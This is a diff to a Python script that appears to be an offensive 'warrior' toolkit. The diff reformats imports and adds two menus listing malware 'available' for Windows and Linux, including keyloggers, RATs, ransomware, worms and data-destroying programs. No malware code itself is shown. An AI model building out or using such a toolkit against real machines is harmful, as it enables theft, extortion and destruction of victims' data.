@@ -1,7 +1,14 @@
-import os,time,colorama,socket,shutil,smtplib,platform,subprocess
+import os
+import time
+import colorama
 from colorama import Fore, Style, Back
+import socket
+import shutil
+import smtplib
 from threading import Timer
 from datetime import datetime
+import platform
+import subprocess
 
 print(platform.system())
 print(platform.release())
@@ -4728,6 +4735,43 @@ while True:
     ||────────▀▀─▀▀─────────||                 || 
     ||./warrior -o Android -s                  ||
     =============================================''')
+ elif command == "./warrior -v -o Windows":
+     print(Fore.GREEN + """
+=============================================
++|           W I N D O W S                  |+
+=============================================
++|    V I R U S   A V A I L A B L E        |+
++|-----------------------------------------|+
++|       [1]Keylogger                      |+
++|       [2]System Deletion                |+
++|       [3]Rat                            |+
++|       [4]Kill wifi                      |+
++|       [5]Destroy Windows                |+
++|       [6]Ransomware                     |+
++|       [7]ILY Virus                      |+
++|       [8]Blasterworm                    |+
++|       [9]Format                         |+
++|       [10]Registry                      |+
++|       [11]Internetkiller(permanent)     |+
++|       [12]Neurax.go(worm)               |+
++|       [13]SystemMeltdown                |+
+ ===========================================
+     """)
+ elif command == "./warrior -v -o Linux":
+     print(Fore.MAGENTA + """
+=============================================
++|              L I N U X                   |+
+=============================================
++|    V I R U S   A V A I L A B L E        |+
++|-----------------------------------------|+
++|       [1]Keylogger                      |+
++|       [2]File Deletion                  |+
++|       [3]ELF Virus                      |+
++|       [4]Linux_virus.c                  |+
++|       [5]Ransomware                     |+
++|       [6]Rat                            |+
+ ===========================================
+     """)
  elif command == "./warrior -o Windows":
     print(Fore.GREEN + '''
 =============================================
